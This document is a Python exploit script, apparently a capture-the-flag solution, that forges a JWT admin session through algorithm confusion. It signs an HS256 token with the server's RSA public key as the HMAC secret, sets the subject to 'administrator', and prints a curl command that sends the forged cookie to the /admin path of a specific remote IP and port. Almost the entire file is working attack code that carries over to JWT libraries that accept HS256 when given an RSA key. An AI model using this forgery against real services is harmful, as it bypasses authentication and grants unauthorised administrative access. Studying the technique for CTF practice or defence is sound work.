import jwt
import hmac
import hashlib
import base64
import json
import sys

def base64url_encode(data):
    if isinstance(data, str):
        data = data.encode('utf-8')
    encoded = base64.urlsafe_b64encode(data).rstrip(b'=')
    return encoded.decode('utf-8')

# The public key from the REMOTE server (extracted from the certificate you provided)
# We must use this EXACT string as the secret.
# IMPORTANT: The server reads the file using f.read(), which includes the trailing newline.
# We must ensure our key string also has that trailing newline.
REMOTE_PUBLIC_KEY = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAvXeIB/wNgUrWt18GhfL8
sT3y8ulEJOa2FgwKFvEmIZ7q1JfJypcnWDw2vKyAZeLug7j0scEuIxUPoGAN1FVE
uENI8oHDGew/4cl1kfIX9yJe+4eNsYcwkpzQvEpxkYxlMsP5lm6R35q/gJz4XmPI
o3rKjuuGfwrMdBhzrtFxBh8HDmGqfhTymB4+N0PCYj4Pz8nPDZoeJtgxWcvIJuJZ
xHzIkhZR0+HKS9HejcMbNogQsDq5B1JbhzGB+fr9c5XM7DQyXq/UDWSX8z0IhlAZ
0nCFCa4W1ViJZfzPLoX3+jhW/TAHG42Yb/1+FzHGTgPPfUoOU0IIhaPLOeayD9JD
hwIDAQAB
-----END PUBLIC KEY-----
"""

print(f"Using Remote Public Key (first 50 chars): {REMOTE_PUBLIC_KEY[:50]}...")
print(f"Key length: {len(REMOTE_PUBLIC_KEY)}")
if REMOTE_PUBLIC_KEY.endswith('\n'):
    print("Key ends with newline (Correct)")
else:
    print("Key does NOT end with newline (Incorrect)")

# 1. Header
header = {
    "alg": "HS256",
    "kid": "neon_root_key"
}

# 2. Payload
payload = {
    "sub": "administrator",
    "iss": "DecoyKeyCTF"
}

encoded_header = base64url_encode(json.dumps(header, separators=(',', ':')))
encoded_payload = base64url_encode(json.dumps(payload, separators=(',', ':')))

signing_input = f"{encoded_header}.{encoded_payload}"

# 3. Sign using the public key string as the HMAC secret
# IMPORTANT: We use the exact string, including newlines.
signature = hmac.new(
    REMOTE_PUBLIC_KEY.encode('utf-8'),
    signing_input.encode('utf-8'),
    hashlib.sha256
).digest()

encoded_signature = base64url_encode(signature)

forged_token = f"{signing_input}.{encoded_signature}"

print("\n--- Forged Token (For Remote Server) ---")
print(forged_token)
print("\n--- Curl Command ---")
print(f"curl -H 'Cookie: session={forged_token}' http://35.193.28.19:35631/admin")
